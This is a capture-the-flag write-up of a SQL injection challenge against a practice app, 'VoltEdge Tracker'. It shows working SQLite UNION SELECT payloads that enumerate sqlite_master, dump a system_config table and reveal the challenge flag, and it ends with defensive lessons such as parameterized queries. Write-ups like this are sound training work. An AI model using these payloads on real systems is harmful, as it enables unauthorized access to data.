# 🔐 VoltEdge Tracker – SQL Injection Walkthrough (Challenge 1)

## 📌 Overview

* **Category:** Web Exploitation
* **Challenge Type:** SQL Injection (SQLi)
* **Target:** `/sqli/search`
* **Goal:** Extract sensitive data from the backend database

---

## 🔍 Recon & Initial Analysis

The VoltEdge Tracker application provides an asset search feature. At first glance, it appears simple, but further inspection reveals potential vulnerabilities.

From the **About page**, a critical clue was discovered:

> The system was migrated from **Access DB → SQLite**

This immediately shaped the attack strategy, since SQLite uses different schema tables (e.g., `sqlite_master` instead of `information_schema`).

---

## 🧪 Step 1 – Identifying the Vulnerability

Testing basic input:

```sql
'--
```

### Result:

* The application returned **all records**

### ✅ Conclusion:

> The application is vulnerable to **SQL Injection**

---

## 🔢 Step 2 – Determining Column Count

By analyzing the structure of the returned table, it was determined that the query outputs **6 columns**.

This is critical for constructing valid `UNION SELECT` payloads.

---

## 🧪 Step 3 – Confirming UNION Injection

To match the column count:

```sql
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL FROM system_config--
```

### Result:

* Query executed successfully

### ✅ Conclusion:

> `UNION SELECT` injection is working

---

## 🔍 Step 4 – Enumerating Database Structure

Since the backend is SQLite, schema information is stored in:

```sql
sqlite_master
```

### Payload:

```sql
' UNION SELECT sql,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE name='system_config'--
```

### Result:

```sql
CREATE TABLE system_config (
    id INTEGER PRIMARY KEY,
    config_key TEXT,
    config_value TEXT
)
```

---

## 🔓 Step 5 – Extracting Sensitive Data

With the table structure identified, the next step is to retrieve its contents:

```sql
' UNION SELECT config_key,config_value,NULL,NULL,NULL,NULL FROM system_config--
```

### 🎯 Results:

Sensitive internal data was exposed, including:

* License key
* Backup schedule
* Maintenance window
* Application version

---

## 🏁 Flag

```text
CYBR3200{union_select_the_unseen_a7c3}
```

---

## 🧠 Key Takeaways

### 🔹 1. Metadata Pages Are Valuable

* The **About page** revealed the database type (SQLite)
* This directly influenced the attack approach

---

### 🔹 2. SQLite Requires Different Enumeration

* Uses `sqlite_master` instead of `information_schema`
* Understanding DB-specific behavior is crucial

---

### 🔹 3. Column Count Matters

* Matching the number of columns is required for successful `UNION SELECT`

---

### 🔹 4. Input Validation Failures Are Dangerous

* A simple search field exposed sensitive configuration data

---

## 🔐 Security Lessons

This challenge highlights the importance of:

* Using **parameterized queries / prepared statements**
* Proper **input validation and sanitization**
* Limiting **database permissions**
* Avoiding exposure of **internal system details**

---

## 💬 Final Thoughts

This challenge demonstrates how:

> Small clues + methodical testing can lead to full database compromise.

Once the database type was identified, the process became a structured sequence of:

* Enumeration
* Exploitation
* Data extraction

---

## ✍️ Author

Savannah Holiday

